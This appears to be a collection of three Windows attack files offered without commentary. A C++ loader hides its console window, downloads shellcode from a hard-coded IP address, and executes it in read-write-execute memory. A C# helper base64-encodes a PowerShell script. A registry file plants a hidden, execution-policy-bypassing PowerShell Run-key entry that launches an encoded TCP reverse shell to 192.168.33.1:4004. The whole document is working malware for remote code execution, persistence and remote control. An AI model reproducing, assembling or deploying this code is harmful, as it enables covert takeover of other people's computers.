#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>


extern "C" __declspec(dllexport) void Start(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    // Decrypt and execute in-memory payload here
}

int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
    
    cpr::Response r = cpr::Get(cpr::Url{ "http://192.168.29.208/home" });
    char* memBuffer = NULL;
    memBuffer = (char *)r.text.c_str();

    unsigned char shellcode[382]; // This is the size of shellcode
    memBuffer += 2;
    for (size_t count = 0; count < sizeof shellcode - 1; count++) {
        sscanf_s(memBuffer, "%02hhx", &shellcode[count]);
        memBuffer = memBuffer + 4;
    }

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}

using System;
using System.IO;
using System.Text;

public class EncodeShell {
	public static void Main(string[] args) {
		var text = File.ReadAllText("shell.ps1");
		var s = Convert.ToBase64String(Encoding.Unicode.GetBytes(text));
		Console.WriteLine(s);
	}
}

﻿Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"Baaaa"="powershell -executionpolicy bypass -windowstyle hidden -command \"$a = Get-ItemProperty -Path HKLM:\\System\\a | %{$_.v}; powershell -executionpolicy bypass -windowstyle hidden -encodedcommand $a\""

[HKEY_LOCAL_MACHINE\SYSTEM\a]
"v"="JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAzADMALgAxACIALAA0ADAAMAA0ACkAOwAkAHMAdAByAGUAYQBtAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawA9ACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgA9ACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA=="




